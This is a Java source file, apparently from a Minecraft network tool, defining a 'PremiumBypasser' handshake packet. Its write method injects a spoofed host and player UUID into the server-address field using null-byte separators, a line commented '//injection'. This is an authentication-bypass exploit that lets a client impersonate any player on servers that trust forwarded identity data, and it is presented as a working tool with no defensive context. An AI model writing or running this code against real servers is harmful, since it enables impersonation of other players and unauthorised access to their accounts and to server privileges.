/*
THE FOLLOWING CODE TAKES LIFE THANKS TO THAMESSIA IN DECEMBER 2021.
*/
package studio.thamessia.Bypass;

import studio.thamessia.Packets.Handshake.NextState;
import studio.thamessia.Packets.Packet;
import studio.thamessia.Utils.DataTypes;

import java.io.DataInputStream;
import java.io.IOException;

public class PremiumBypasser extends Packet<PremiumBypasser> {
    private final int protocolVersion;
    private final String serverAddress;
    private final int port;
    private final NextState nextState;
    private final String spoofedHost;
    private final String spoofedUUID;

    public PremiumBypasser(int protocolVersion, String serverAddress, int port, NextState nextState, String spoofedHost, String spoofedUUID) {
        super(0x00);
        this.protocolVersion = protocolVersion;
        this.serverAddress = serverAddress;
        this.port = port;
        this.nextState = nextState;
        this.spoofedHost = spoofedHost;
        this.spoofedUUID = spoofedUUID;
    }

    @Override
    public PremiumBypasser readPacket(DataInputStream dis) {
        return null;
    }

    @Override
    public void writeData() {
        try {
            DataTypes.writeVarInt(dataOutputStream, protocolVersion);
            DataTypes.writeString(dataOutputStream, serverAddress + "\00" + spoofedHost + "\00" + spoofedUUID); //injection
            dataOutputStream.writeShort(port);
            DataTypes.writeVarInt(dataOutputStream, nextState.getValue());
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
